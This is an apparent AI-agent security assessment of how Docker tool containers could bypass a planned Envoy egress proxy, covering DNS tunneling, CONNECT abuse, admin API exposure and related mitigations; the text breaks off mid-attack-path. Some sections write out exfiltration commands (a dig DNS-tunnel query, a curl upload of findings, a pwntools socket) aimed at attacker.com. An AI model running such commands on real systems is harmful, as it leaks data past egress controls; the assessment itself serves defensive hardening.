# Envoy Forward Proxy Bypass Assessment

> **Engagement ID:** RED-W13-001
> **Agent:** red-vuln (Vulnerability Analyst)
> **Phase:** Vulnerability Analysis
> **Date:** 2026-03-18
> **Status:** COMPLETE
> **Authorization Level:** Architecture analysis; no live exploitation; read-only engagement

## Document Sections

| Section | Purpose |
|---------|---------|
| [L0 Executive Summary](#l0-executive-summary) | Risk posture, critical findings, stakeholder summary |
| [Architecture Context](#architecture-context) | Ground-truth analysis of actual implementation |
| [L1 Bypass Vector Inventory](#l1-bypass-vector-inventory) | All 10 vectors with full technical assessment |
| [L2 Attack Path Analysis](#l2-attack-path-analysis) | Chained scenarios and strategic risk |
| [Prioritized Finding Index](#prioritized-finding-index) | Ranked by exploitability and impact |
| [Mitigation Map to FEAT-W13](#mitigation-map-to-feat-w13) | Engineering recommendations per task |
| [Analysis Limitations](#analysis-limitations) | Gaps and unvalidated markers |

---

## L0 Executive Summary

### Risk Posture: HIGH (pre-mitigation) / MEDIUM (current implementation)

The Envoy forward proxy isolation architecture provides meaningful containment for HTTP/HTTPS traffic but contains several design gaps that collectively allow a compromised tool container to bypass proxy controls. The most critical finding is that the current implementation does not yet include Envoy: the actual Docker Compose files observed show `internal: true` networks with no Envoy proxy service defined. This means the current state is weaker than the target-state architecture being assessed.

### Vulnerability Count by Severity

| Severity | Count | Vectors |
|----------|-------|---------|
| CRITICAL | 1 | V4 (current state: no proxy at all for recon-net, cloud-net, exploit network has no `internal: true`) |
| HIGH | 4 | V1 (DNS tunneling), V3 (CONNECT abuse), V6 (Envoy admin), V10 (Envoy admin API) |
| MEDIUM | 3 | V5 (Docker escape), V7 (shared volume side-channel), V9 (east-west lateral movement) |
| LOW | 2 | V2 (raw TCP bypass -- mitigated by `internal: true`), V8 (IPv6 bypass) |

### Top Three Exploitable Findings (Pre-FEAT-W13 Hardening)

1. **No Envoy deployed (CRITICAL):** The recon-net and cloud-net in `skills/rainbow-recon/tests/docker/docker-compose.yml` and `skills/rainbow-cloud/tests/docker/docker-compose.yml` use plain `bridge` networks with no `internal: true` and no Envoy proxy. A tool container has unrestricted internet egress. The exploit network also lacks `internal: true`.

2. **DNS Tunneling through `internal: true` networks (HIGH):** Docker's `internal: true` suppresses the default gateway route but leaves DNS resolution operational via the Docker embedded DNS server (127.0.0.11), which can forward queries externally. Tool containers can exfiltrate data via crafted DNS queries.

3. **Envoy CONNECT Method Abuse (HIGH):** When CONNECT tunneling is enabled in Envoy for HTTPS, the CONNECT mechanism creates an opaque TCP tunnel. A tool can abuse this to reach non-allowlisted hosts if the destination port matches an allowed pattern and host validation is not enforced at the SNI level.

### Key Recommendations for Stakeholders

- Deploy Envoy now for recon-net and cloud-net containers; current networks have unrestricted egress.
- Implement explicit DNS resolver controls in tool containers (block external DNS forwarding or use Envoy as DNS resolver proxy).
- Disable CONNECT in Envoy except for specific HTTPS endpoints; enforce SNI-based host validation.
- Prevent exposure of the Envoy admin interface (port 9901) inside the internal network.
- Restrict shared volume mounts to read-only for scope documents and engagement configs.

---

## Architecture Context

### What the Code Actually Shows

Reading the actual Docker Compose files reveals a gap between the described target architecture and the current implementation.

**docker-compose.base.yml and docker-compose.full.yml** (skills/rainbow/tests/docker/):
- `rainbow-isolated`, `blue-isolated`, `exploit-isolated`, `rainbow-net`, `blue-net`, `exploit-net` all declare `internal: true`.
- No Envoy service is defined in any of these files.
- No HTTP_PROXY environment variables are set.
- Conclusion: these test-harness networks are fully isolated but have no proxy-mediated egress at all.

**skills/rainbow-recon/tests/docker/docker-compose.yml:**
- `recon-net` uses `driver: bridge` with NO `internal: true`.
- Comment states: "Default: bridge allows outbound; ACLs restrict to authorized targets only (Phase 6)."
- No Envoy, no HTTP_PROXY, no iptables ACLs deployed.
- Conclusion: this network has unrestricted internet egress in the current state.

**skills/rainbow-cloud/tests/docker/docker-compose.yml:**
- `cloud-net` uses `driver: bridge` with NO `internal: true`.
- Same Phase 6 note. No Envoy deployed.
- Conclusion: cloud-auditor container has unrestricted internet egress.

**skills/rainbow-exploit/tests/docker/docker-compose.yml:**
- No network defined at all -- containers use Docker default bridge.
- Docker default bridge DOES have internet access (unless restricted by host firewall).
- Comment: "Full structural enforcement (docker network connect/disconnect per approved operation) is target-state -- Phase 6."
- Conclusion: exploit-ops, exploit-c2, exploit-msf containers have unrestricted internet egress.

**Critical observation:** The Envoy proxy architecture described in the engagement brief is the PLANNED target-state (Phase 6). The current implementation relies on behavioral controls (P-020 per-operation approval) rather than structural network enforcement. The bypass vectors below are assessed against BOTH the current state and the target-state Envoy architecture.

---

## L1 Bypass Vector Inventory

### V1 -- DNS Tunneling

**ATT&CK Technique:** T1071.004 (Application Layer Protocol: DNS), T1048.003 (Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol)

#### Attack Description

DNS tunneling encodes data as subdomains of attacker-controlled domains. Tools like `iodine`, `dnscat2`, or custom scripts can exfiltrate data at ~1-4 KB/s without using HTTP. The attack works by issuing DNS queries to a resolver that forwards them to an authoritative nameserver the attacker controls:

```
tool-container -> DNS query for <base64-data>.exfil.attacker.com
               -> Docker DNS (127.0.0.11)
               -> Recursive resolver (8.8.8.8 or host resolver)
               -> Attacker's authoritative NS
```

In a Docker `internal: true` network, the default gateway route is suppressed, but the Docker embedded DNS server (127.0.0.11) remains reachable. This resolver forwards queries upstream through the Docker daemon's host network stack, which does have internet access. The container itself cannot route IP packets to 8.8.8.8 directly, but the DNS resolver is a service provided by the Docker daemon on the host, not a route the container controls.

Affected tools in scope: any container with network access to 127.0.0.11 (all Docker containers), including exploit-ops, exploit-msf, recon-pipeline, cloud-auditor.

#### Feasibility Assessment: HIGH

DNS resolution works through `internal: true` networks. This is confirmed Docker behavior -- the embedded DNS server (127.0.0.11) operates independently of whether the network has a default gateway. Any container that can resolve DNS names can use DNS tunneling.

Validation command (manual, not executed by this agent):
```
# From inside a container on an internal: true network:
dig TXT $(echo "secret-data" | base64).exfil.attacker.com @127.0.0.11
```

#### Impact If Successful

- Credential exfiltration bypassing credential filter (DNS responses are not filtered by the current L1/L2/L3 pipeline).
- C2 channel establishment (dnscat2 provides an interactive shell over DNS).
- Exfiltration of engagement scope documents, found credentials, or engagement output from /work volumes.
- Data rate: ~1-4 KB/s (sufficient for credentials and small files).

#### Current Architecture Prevention

**Current state (NO Envoy):** Not prevented. All networks have access to 127.0.0.11.
**Target state (WITH Envoy):** Not prevented by Envoy. Envoy is a forward HTTP proxy; it does not intercept DNS queries. DNS tunneling bypasses Envoy entirely.

#### Recommended Mitigation Mapping to FEAT-W13

1. Configure tool containers to use a controlled DNS resolver rather than 127.0.0.11. Deploy a DNS-filtering proxy (e.g., Pi-hole, Unbound with allowlist) on the internal network and configure containers with `dns: [<dns-proxy-ip>]` in Docker Compose.
2. Implement DNS query rate limiting and monitoring (flag queries with subdomain length > 60 chars).
3. Block DNS-over-HTTPS (DoH) within Envoy's HTTP allowlist to prevent DNS tunneling over HTTPS.
4. Consider deploying a DNS allowlist that permits only known-good domains (e.g., tool update endpoints, target domains from scope).

Relevant CVE: No specific CVE; this is a design-level architectural gap. OWASP A04:2021 (Insecure Design) applies.

---

### V2 -- Raw TCP Bypass

**ATT&CK Technique:** T1095 (Non-Application Layer Protocol), T1571 (Non-Standard Port)

#### Attack Description

Tools like Impacket (SMB/RPC), pwntools (raw sockets), and msfconsole (arbitrary TCP) do not use the HTTP_PROXY environment variable. They open raw TCP sockets directly. If a container has a route to an external host, these tools can reach it without going through Envoy.

```python
# pwntools raw TCP -- ignores HTTP_PROXY
from pwn import *
conn = remote('attacker.com', 443)  # Direct TCP, no proxy
```

#### Feasibility Assessment: LOW (for `internal: true` networks)

**Current state (recon-net, cloud-net, exploit-net have NO `internal: true`):** CRITICAL -- raw TCP has full internet egress.
**Target state (with `internal: true` + Envoy):** LOW. Docker `internal: true` removes the default gateway route from the container's network namespace. `ip route` inside the container will show no default route. Packets destined for external IPs have no route and are dropped by the kernel. The container can only reach other containers on the same `internal: true` network and the Docker DNS server.

Validation: Linux network namespaces enforce this at the kernel level. A container cannot route packets to an external host without a gateway route. This is not bypassable from inside the container without kernel-level capabilities (see V5).

#### Impact If Successful

In the current state (no `internal: true` on recon/cloud/exploit networks): full unrestricted TCP egress, C2 establishment, lateral movement to external infrastructure.

In the target state: not exploitable via raw TCP alone.

#### Current Architecture Prevention

**Current state:** NOT PREVENTED for recon-net, cloud-net, and exploit-net (no `internal: true`).
**Target state (with `internal: true`):** PREVENTED for direct TCP to external hosts. Raw TCP can still reach other containers on the same internal network (V9: east-west).

#### Recommended Mitigation Mapping to FEAT-W13

1. Add `internal: true` to recon-net and cloud-net immediately (before Envoy deployment).
2. Add explicit `internal: true` to the exploit network.
3. When Envoy is deployed, set HTTP_PROXY and HTTPS_PROXY environment variables in all tool containers so HTTP tools route through Envoy.
4. Tools that must reach external hosts (Prowler, Kubescape, Subfinder) should do so only through Envoy with domain allowlists.

---

### V3 -- CONNECT Method Abuse

**ATT&CK Technique:** T1572 (Protocol Tunneling), T1090 (Proxy)

#### Attack Description

The HTTP CONNECT method is used by clients to establish TCP tunnels through a forward proxy for HTTPS traffic. When Envoy receives `CONNECT target.com:443`, it opens a TCP connection to target.com:443 and relays bytes between the client and the server. This is necessary for legitimate HTTPS proxying.

Abuse vector: If Envoy's CONNECT handling only validates the host against the allowlist but does not enforce that the tunnel actually carries TLS traffic, a tool can send arbitrary bytes through the tunnel. More critically, if CONNECT is allowed to any host matching a wildcard (e.g., `*.googleapis.com:443`), a tool can establish a CONNECT tunnel to a non-allowlisted host by:

1. **DNS rebinding variant:** Resolve attacker.com to the IP of googleapis.com, then issue CONNECT to the resolved IP. Some proxy implementations check hostname rather than IP.
2. **Port matching bypass:** If CONNECT is permitted to any host on port 443, the tool can establish CONNECT to any host listening on 443, not just HTTPS endpoints.
3. **Allowlisted host pivot:** CONNECT to an allowlisted CDN (e.g., a PyPI or NPM endpoint) that itself supports server-side request forwarding.
4. **SNI mismatch:** Envoy validates the CONNECT hostname but the TLS ClientHello inside the tunnel presents a different SNI, routing to a different server at the TLS layer.

#### Feasibility Assessment: HIGH (if CONNECT is enabled without SNI enforcement)

Envoy's `tunneling_config` or HTTP proxy filter configuration determines CONNECT behavior. By default, Envoy does NOT automatically allow CONNECT tunneling -- it must be explicitly enabled. However, if enabled for HTTPS support and the allowlist only checks the hostname in the CONNECT request header (not post-decryption SNI), variants 2 and 4 above are exploitable.

CVE reference: This class of vulnerability has appeared in proxy implementations. CVE-2022-25648 (Git) involved CONNECT tunneling bypasses. Envoy-specific: CVE-2023-44487 (HTTP/2 rapid reset) is separate but demonstrates Envoy's attack surface under high-volume manipulation.

#### Impact If Successful

- Establishment of arbitrary TCP tunnel through Envoy to any host reachable by Envoy's egress network.
- Bypasses domain allowlist if hostname validation is incomplete.
- Can establish C2 channel over HTTPS tunnel appearing as legitimate HTTPS traffic.

#### Current Architecture Prevention

**Current state (no Envoy):** Not applicable; no proxy to abuse.
**Target state (with Envoy + CONNECT):** PARTIALLY PREVENTED if SNI-based validation is implemented in addition to hostname header validation. NOT PREVENTED if CONNECT allowed to any port 443.

#### Recommended Mitigation Mapping to FEAT-W13

1. Disable CONNECT entirely unless required. Use Envoy's `allow_connect: false` in the HTTP connection manager.
2. If CONNECT is required for HTTPS, enforce it with:
   - Allowlist on the CONNECT hostname (not just IP).
   - TLS inspection (Envoy as MITM) to validate the actual SNI post-CONNECT, if legal and within engagement scope.
   - Restrict CONNECT to a whitelist of specific `host:port` pairs, not wildcards.
3. Implement Envoy access logging for all CONNECT requests with target host and bytes transferred.
4. Rate-limit CONNECT tunnel duration and data volume per connection.

---

### V4 -- Proxy Environment Variable Stripping

**ATT&CK Technique:** T1562 (Impair Defenses), T1036 (Masquerading)

#### Attack Description

HTTP tools in Python, Go, and curl respect the HTTP_PROXY, HTTPS_PROXY, and NO_PROXY environment variables. A tool process or a malicious script running inside the container could unset these before making network requests:

```bash
unset HTTP_PROXY HTTPS_PROXY
curl https://attacker.com/exfil -d @/work/findings.txt  # Goes direct, not through Envoy
```

This attack only works if the container has a direct route to the internet (i.e., NOT on an `internal: true` network). If the network has no default gateway, unsetting HTTP_PROXY causes the request to fail (no route to host) rather than bypass Envoy.

#### Feasibility Assessment: CRITICAL (current state) / LOW (target state with `internal: true`)

**Current state (recon-net, cloud-net, exploit-net: no `internal: true`):** CRITICAL. Any tool that unsets HTTP_PROXY has direct internet access. Subfinder, httpx, dnsx, Prowler, Kubescape, pwntools, Impacket -- all have unrestricted egress in the current implementation.
**Target state (with `internal: true` + Envoy):** LOW. Without a default gateway route, unsetting HTTP_PROXY causes connection failures. The container cannot reach the internet directly even if the proxy is bypassed.

This is why `internal: true` is architecturally essential and not optional -- it is the fallback that makes proxy stripping ineffective.

#### Impact If Successful

In current state: complete bypass of all proxy controls, unrestricted internet egress for any HTTP tool. This is the most impactful finding given the current implementation state.

#### Current Architecture Prevention

**Current state:** NOT PREVENTED. Recon and cloud containers have no `internal: true`, so HTTP_PROXY stripping enables direct egress.
**Target state (with `internal: true`):** PREVENTED by network isolation.

#### Recommended Mitigation Mapping to FEAT-W13

1. Add `internal: true` to recon-net and cloud-net immediately. This is the single most impactful hardening action available without Envoy deployment.
2. When deploying Envoy, enforce HTTP_PROXY in the container startup script (entrypoint wrapper) rather than relying on environment variables that processes can unset. Consider running tools via a wrapper that re-injects proxy settings before each tool invocation.
3. Use iptables REDIRECT rules inside the container (or on the host) to intercept all port 80/443 traffic and redirect it to the Envoy proxy port, making proxy stripping ineffective even on networks without `internal: true`. This is a transparent proxy model.

---

### V5 -- Docker Network Escape

**ATT&CK Technique:** T1611 (Escape to Host), T1068 (Exploitation for Privilege Escalation)

#### Attack Description

Docker container network isolation is enforced by Linux network namespaces. Escaping requires either:
- **Container breakout:** Exploiting a vulnerability to gain host process access, from which the attacker can manipulate host network namespaces, add routes, or interact with the Docker daemon socket.
- **Privileged container:** If a container runs with `--privileged` or has CAP_NET_ADMIN, it can modify its own network namespace (add routes, create tunnel interfaces).
- **Mounted Docker socket:** If `/var/run/docker.sock` is mounted inside a container, the container can create new containers with unrestricted network access.
- **Host network mode:** A container running with `--network=host` shares the host network namespace and bypasses all Docker network isolation.

Reviewing the Dockerfiles and Docker Compose files in this codebase:
- All services use `security_opt: no-new-privileges:true` -- prevents privilege escalation via setuid binaries.
- No containers mount `/var/run/docker.sock`.
- No containers use `--privileged` or `--network=host`.
- The exploit-ops container runs as `appuser` (non-root) per the Dockerfile.
- The Metasploit container runs as the default user defined in `metasploitframework/metasploit-framework:6.4` (typically non-root in newer versions).

Known relevant CVEs for Docker network escape:
- **CVE-2019-5736** (runc container breakout): Affects runc < 1.0-rc6. Requires container write access to host runc binary. Mitigation: use current Docker/runc versions.
- **CVE-2022-0492** (cgroup v1 escape via `release_agent`): Requires CAP_SYS_ADMIN. Containers without this capability are not affected.
- **CVE-2024-21626** (runc Leaky Vessels): runc < 1.1.12. Allows working directory escape but not full host access. File system impact, not direct network bypass.

#### Feasibility Assessment: MEDIUM

Without kernel vulnerabilities, the current configuration (no-new-privileges, non-root user, no privileged flag, no Docker socket mount) effectively prevents container escape. However:
- The Metasploit container image `metasploitframework/metasploit-framework:6.4.0` is a third-party image. Its exact capabilities and running user must be verified.
- The exploit-c2 container exposes port 1337 to the host (`ports: - "1337:1337"`), which publishes a C2 listener to the host network. If this port is reachable from external networks, it represents an inbound attack vector, not an outbound bypass.
- Kernel-level exploits (unpatched CVEs) remain a theoretical path. The host kernel version matters.

#### Impact If Successful

Full host access, ability to interact with Docker daemon, ability to join any Docker network including those with internet access, complete bypass of all isolation controls.

#### Current Architecture Prevention

PARTIALLY PREVENTED by `no-new-privileges` and non-root user. NOT FULLY PREVENTED against kernel-level exploits or if the Metasploit image has unexpected capabilities.

#### Recommended Mitigation Mapping to FEAT-W13

1. Audit the Metasploit 6.4 image for running user and capabilities. Add explicit `user:` directive if the image allows root by default.
2. Add `cap_drop: ALL` plus selective `cap_add` for only required capabilities to all exploit containers.
3. Consider using `seccomp` profiles to restrict syscalls available to tool containers.
4. Pin all third-party base images to specific digest hashes (not just version tags) to prevent supply chain substitution.
5. Enable Docker Content Trust (DCT) for image verification.
6. Implement host-level monitoring for container escape indicators (unusual process reparenting, /proc/self/exe access patterns).

---

### V6 -- Envoy Config Manipulation via Mounted Volume

**ATT&CK Technique:** T1565 (Data Manipulation), T1574 (Hijack Execution Flow)

#### Attack Description

If the Envoy configuration file or the directory containing it is mounted into a tool container (or onto a volume shared between tool containers and the Envoy container), a compromised tool container can modify the Envoy allowlist configuration. This would allow the attacker to add their destination to the allowlist, restart Envoy (or trigger a config reload via the admin API), and then reach previously-blocked destinations through the proxy.

Envoy supports xDS (dynamic configuration via gRPC) and static file-based configuration. For file-based configuration, Envoy watches a YAML file. If Envoy's `--config-path` points to a file on a shared volume, and that volume is writable by tool containers, config injection is possible.

#### Feasibility Assessment: HIGH (if Envoy is deployed with shared config volumes)

In the current implementation (no Envoy deployed), this is not applicable. For the target-state architecture, this risk depends entirely on how the Envoy config volume is structured.

The shared `/work` volume (mounted as `../../../../work:/work` in recon, cloud, and exploit containers) currently contains engagement artifacts. If the FEAT-W13 Envoy deployment places the Envoy config file on this same `/work` volume, or on any volume accessible to tool containers, config manipulation becomes possible.

The engagement scope document (`SCOPE.md`) is generated by the orchestrator and used to generate Envoy allowlist configs (per the zone-2-active.md design). If SCOPE.md itself is on a writable volume accessible to tool containers, a compromised tool could write a malicious SCOPE.md that generates a permissive Envoy config on the next orchestrator run (V7 overlap).

#### Impact If Successful

Complete bypass of Envoy allowlist. All destination restrictions removed. Full internet egress through the proxy.

#### Current Architecture Prevention

NOT APPLICABLE (Envoy not deployed). For target state: UNKNOWN -- depends on volume architecture of FEAT-W13 implementation.

#### Recommended Mitigation Mapping to FEAT-W13

1. Envoy config files MUST be on a volume not shared with tool containers. Use a dedicated `envoy-config` volume mounted ONLY into the Envoy container.
2. Tool containers MUST NOT have write access to engagement scope documents (SCOPE.md, allowlist configs). Mount scope documents read-only (`read_only: true`).
3. Use Envoy's xDS dynamic configuration served from a control plane (e.g., a simple Python HTTP server or management service) rather than file-based config. Tool containers cannot write to a network service.
4. If file-based config is used, set filesystem permissions so the Envoy config directory is owned by the Envoy container's user, not the tool container's user.
5. Enable Envoy config change monitoring and alert on unexpected config reloads.

---

### V7 -- Side-Channel via Shared /work Volume

**ATT&CK Technique:** T1565.001 (Stored Data Manipulation), T1059 (Command and Scripting Interpreter)

#### Attack Description

All tool containers (exploit-ops, exploit-msf, exploit-c2, recon-pipeline, cloud-auditor) mount `../../../../work:/work` as a read-write volume. This shared volume is the primary mechanism for tool output persistence. A compromised container can:

1. **Read other containers' output:** A compromised exploit-ops container can read reconnaissance output from recon-pipeline, including discovered targets, credentials found in HTTP responses, and engagement scope documents.
2. **Write malicious artifacts:** Write a crafted SCOPE.md or engagement configuration that a subsequent orchestrator run will interpret as authorizing expanded scope or a permissive Envoy allowlist (V6 overlap).
3. **Race condition attack:** If two containers process SCOPE.md concurrently (e.g., orchestrator writes, Envoy config generator reads), a compromised container can win a race to inject content between the write and the read.
4. **Canary file detection:** The `/fixtures/canary` bind mount (read-only in test harnesses) contains canary credential files. While these are read-only, a compromised container can detect their presence and validate that it is in a Jerry test environment, enabling targeted evasion.

#### Feasibility Assessment: MEDIUM

Requires a compromised container and depends on orchestration timing for the race condition variant. The read access to other containers' output is straightforward -- no race condition required.

Critical observation: The exploit containers (Zone 3, highest privilege) share the same `/work` volume as the orchestrator. This means a compromised Zone 3 container can modify artifacts that the orchestrator subsequently reads, potentially influencing orchestrator decisions.

#### Impact If Successful

- Exfiltrate reconnaissance findings, credentials, engagement scope details without any network egress.
- Influence orchestrator behavior by modifying shared workspace files.
- Enable scope creep: a manipulated SCOPE.md could authorize targets outside the original engagement.

#### Current Architecture Prevention

PARTIALLY PREVENTED by read-only mounts for fixture files. NOT PREVENTED for /work volume, which is read-write for all containers.

#### Recommended Mitigation Mapping to FEAT-W13

1. Implement per-container subdirectory isolation within /work. Each tool container should only have write access to its own subdirectory (`/work/recon/`, `/work/exploit/`, etc.). Use bind mounts to specific subdirectories rather than the entire /work tree.
2. Mount SCOPE.md and engagement configuration files as read-only inside tool containers. The orchestrator writes these; tool containers only read them.
3. Implement file integrity monitoring on SCOPE.md and Envoy allowlist configs (SHA-256 verification before each read).
4. Apply mandatory access controls (AppArmor or SELinux profiles) to restrict which files each container can access within the shared volume.
5. Consider separate volumes per tool domain (recon-output, exploit-output, cloud-output) rather than a single shared /work volume.

---

### V8 -- IPv6 Bypass

**ATT&CK Technique:** T1048 (Exfiltration Over Alternative Protocol), T1071 (Application Layer Protocol)

#### Attack Description

Docker's `internal: true` removes the IPv4 default gateway route. However, Docker's IPv6 support and behavior with `internal: true` differs from IPv4 handling. Specifically:

- Docker does not enable IPv6 by default on bridge networks unless `enable_ipv6: true` is set.
- If the host has IPv6 connectivity and IPv6 is enabled in the Docker daemon configuration (`/etc/docker/daemon.json`), containers may receive IPv6 addresses and potentially have IPv6 internet access even on `internal: true` networks in some configurations.
- Link-local IPv6 addresses (fe80::/10) are always present on network interfaces and can be used for container-to-container communication without any gateway.
- Tools running inside containers can enumerate IPv6 addresses and attempt connections via IPv6 if the host's IPv6 routing is not explicitly blocked.

CVE reference: CVE-2024-29018 addresses Docker's handling of external DNS requests from internal networks. While not specifically IPv6, it demonstrates that Docker's "internal" guarantees have historically been imperfect.

#### Feasibility Assessment: LOW (on most macOS Docker Desktop deployments)

On macOS with Docker Desktop (which is the development environment per `darwin` platform in the env block), Docker Desktop runs containers inside a Linux VM. IPv6 connectivity from containers to external hosts is generally not available in this configuration. On Linux hosts with IPv6, this risk is higher.

However, the production deployment environment is unknown. If deployed on a Linux host with IPv6 internet connectivity and IPv6 enabled in the Docker daemon, this vector has MEDIUM feasibility.

#### Impact If Successful

Full internet egress via IPv6 for any tool that supports IPv6. DNS queries via IPv6. C2 over IPv6. Bypasses all IPv4-based isolation controls.

#### Current Architecture Prevention

PREVENTED on macOS Docker Desktop (current dev environment). UNKNOWN for production Linux deployment.

#### Recommended Mitigation Mapping to FEAT-W13

1. Explicitly disable IPv6 in Docker Compose network definitions: add `enable_ipv6: false` to all network declarations.
2. On the Docker daemon, disable IPv6 globally in `/etc/docker/daemon.json` if IPv6 is not needed.
3. If IPv6 is needed, ensure `internal: true` networks block IPv6 external routing (verify Docker version behavior).
4. Deploy host-level ip6tables rules to block IPv6 egress from Docker network subnets.

---

### V9 -- Container-to-Container East-West Movement

**ATT&CK Technique:** T1210 (Exploitation of Remote Services), T1021 (Remote Services), T1570 (Lateral Tool Transfer)

#### Attack Description

Containers on the same Docker `internal: true` network (or `bridge` network) can communicate freely with each other by default. Docker does not implement inter-container firewall rules within a network. All containers on the same network share a broadcast domain and can reach each other via container name DNS resolution.

In the current architecture:
- The test-runner container is on BOTH `rainbow-net` and `blue-net`, creating a bridge between the two networks.
- rainbow-recon, rainbow-cloud, rainbow-supply-chain are all on `rainbow-net` (docker-compose.full.yml).
- An exploit container compromised from the outside (via the published port 1337 on exploit-c2) is on `exploit-net`, isolated from `rainbow-net`. However, in `docker-compose.full.yml`, the `exploit-net` is separate.
- rainbow-exploit in `docker-compose.base.yml` is on `exploit-isolated` while others are on `rainbow-isolated`. But the test-runner bridges `rainbow-net` AND `blue-net`.

Specific concern: The test-runner container (if compromised) can pivot from blue-net to rainbow-net and vice versa, since it is attached to both. Any container on rainbow-net can communicate with the cloud-auditor, recon-pipeline, and supply-chain containers.

Within `rainbow-net`: cloud-auditor can reach recon-pipeline, which can reach supply-chain, which can reach neo4j (the graph database). A compromised supply-chain container could attempt to authenticate to neo4j using default or weak credentials.

neo4j default credentials in `docker-compose.full.yml`: `NEO4J_AUTH: "neo4j/test-only-not-real"`. This is a test credential, but if neo4j is reachable from tool containers and the credential is known, any container on rainbow-net can query the graph database.

#### Feasibility Assessment: MEDIUM

Requires a compromised container on the relevant network. The most likely entry point is through a malicious tool input (crafted SBOM that exploits Syft/Grype, malicious container image analyzed by supply-chain tools, or crafted PCAP that exploits network analysis). From a compromised container, east-west movement to other containers on the same network is trivial -- no exploits required, just TCP connections.

The test-runner's dual-network attachment creates a cross-domain bridge that should be explicitly addressed.

#### Impact If Successful

- Exfiltrate data from other tool containers without internet egress (data stays on Docker networks, bypassing network egress monitoring).
- Pivot from a lower-trust container to a higher-trust container on the same network.
- Attack neo4j database with known test credentials.
- Compromise the test-runner to gain simultaneous access to both rainbow-net and blue-net.

#### Current Architecture Prevention

NOT PREVENTED by current network design. Docker does not enforce inter-container firewall rules within a network by default.

#### Recommended Mitigation Mapping to FEAT-W13

1. Implement container-level firewall rules using Docker's `iptables` integration or custom network policy (e.g., using a CNI with NetworkPolicy support for Docker Swarm or Kubernetes).
2. Remove the test-runner from dual-network attachment or restrict its cross-network access to specific ports.
3. Change neo4j credentials from test values in any environment where neo4j data is sensitive.
4. Use Docker network aliases rather than full-network access to implement the principle of least connection: each container should only be able to reach the specific services it needs, not all containers on the network.
5. Deploy Envoy-level per-container traffic policies so that even within the internal network, traffic is inspected and allowlisted.

---

### V10 -- Envoy Admin Interface Exposure

**ATT&CK Technique:** T1098 (Account Manipulation), T1565 (Data Manipulation), T1059.004 (Unix Shell)

#### Attack Description

Envoy exposes an admin interface on port 9901 by default. The admin interface provides:
- `/config_dump`: Full current Envoy configuration including all allowlists, cluster definitions, and listener configs.
- `/runtime_modify`: Runtime configuration modification without restart.
- `/drain_listeners`: Gracefully drain all listener connections.
- `/healthcheck/fail`: Force Envoy to report unhealthy status.
- `/logging`: Adjust log levels.
- `/clusters`: Inspect cluster health and connection stats.
- `POST /runtime`: Add or modify runtime values (may affect filter behavior).

If the Envoy admin interface (port 9901) is bound to the internal network interface (not localhost), any tool container on the same `internal: true` network can reach the admin API. This allows a compromised tool container to:
1. Read the current allowlist configuration (intelligence gathering).
2. Use `/runtime_modify` to add new routes or modify filter behavior if supported.
3. Drain listeners to disrupt proxy operation (denial of service).
4. Modify logging to disable audit trail.

#### Feasibility Assessment: HIGH (if admin interface is on internal network)

Envoy's default admin bind address is `0.0.0.0:9901`, which listens on all interfaces. In a Docker container, this means the admin interface is reachable from any container on the same network. Only a deliberate `address: 127.0.0.1` binding to localhost prevents this.

This is a well-documented Envoy operational security concern. The Envoy documentation explicitly warns that the admin interface should not be exposed publicly.

CVE reference: No single CVE, but Envoy admin interface exposure is a known operational risk documented in Envoy's own security guidance (https://www.envoyproxy.io/docs/envoy/latest/operations/admin). The `/runtime_modify` endpoint has been used in authenticated attacks against internally-exposed Envoy instances.

#### Impact If Successful

- Read complete proxy configuration including allowlists (intelligence gathering without triggering firewall events).
- Potentially modify runtime configuration to bypass allowlists (depends on Envoy version and runtime feature set).
- Disrupt proxy operation, causing tool containers to lose egress connectivity (denial of service against the security control).
- Disable audit logging, removing evidence of prior malicious activity.

#### Current Architecture Prevention

NOT APPLICABLE (Envoy not deployed). For target state: UNKNOWN -- depends on FEAT-W13 Envoy deployment configuration.

#### Recommended Mitigation Mapping to FEAT-W13

1. Bind the Envoy admin interface to `127.0.0.1:9901` inside the Envoy container (not `0.0.0.0`). This restricts admin access to processes inside the Envoy container only.
2. If external access to the admin interface is needed for monitoring, expose it via a separate management network not accessible to tool containers.
3. Do not expose the admin interface on the same internal network as tool containers.
4. In the Envoy static config:
   ```yaml
   admin:
     address:
       socket_address:
         address: 127.0.0.1  # NOT 0.0.0.0
         port_value: 9901
   ```
5. Implement authentication on the admin interface if external access is required (Envoy 1.28+ supports basic auth on admin).

---

## L2 Attack Path Analysis

### Attack Path Alpha: Exfiltration from Compromised Recon Container (Current State)

**Objective:** Exfiltrate engagement findings without triggering the credential filter.
**Prerequisite:** Tool container execution (normal use case, no exploit required).
**Steps:**

1. Tool container runs Subfinder against an authorized target (normal operation).
2. Subfinder's output is written to /work/recon/findings.txt (shared volume).
3. In the current state (recon-net has no `internal: true`), the container has direct internet access.
4. A malicious Subfinder binary (supply chain compromise of the projectdiscovery/subfinder Go binary) or a malicious tool input that triggers code execution can send /work/recon/findings.txt directly to attacker.com:443 without HTTP_PROXY.
5. The credential filter is never invoked because the exfiltration happens via raw TCP, not through the jerry tool exec pipeline.

**Severity:** CRITICAL in current state.
**ATT&CK chain:** T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain) -> T1041 (Exfiltration Over C2 Channel).
**Mitigated by:** Adding `internal: true` to recon-net (highest priority hardening action).

### Attack Path Beta: DNS Exfiltration (Target State with Envoy)

**Objective:** Exfiltrate data after Envoy is deployed and `internal: true` is in place.
**Prerequisite:** Compromised tool execution AND attacker controls a DNS authoritative server.
**Steps:**

1. Tool container is on an `internal: true` network with Envoy as the only HTTP egress path.
2. Attacker has planted a malicious tool binary or exploits a vulnerability in a tool (e.g., Metasploit module loading a crafted Ruby file).
3. Malicious code inside the container issues DNS queries to <base64-encoded-data>.exfil.attacker.com.
4. Docker embedded DNS (127.0.0.11) resolves the query by forwarding to upstream resolvers through the host network.
5. Attacker's authoritative DNS server logs the queries and reconstructs the exfiltrated data.
6. No HTTP traffic flows through Envoy. The credential filter is never invoked. No proxy log entry is created.

**Severity:** HIGH in target state.
**ATT&CK chain:** T1071.004 (DNS C2) -> T1048.003 (Exfiltration Over DNS).
**Mitigated by:** DNS filtering proxy or DNS allowlist enforcement (not addressed by Envoy deployment alone).

### Attack Path Gamma: SCOPE.md Manipulation for Allowlist Injection

**Objective:** Expand the Envoy allowlist to include attacker-controlled domains.
**Prerequisite:** Write access to /work volume (current state) + Envoy deployed (target state).
**Steps:**

1. Compromised tool container writes a modified SCOPE.md to /work/engagements/current/SCOPE.md.
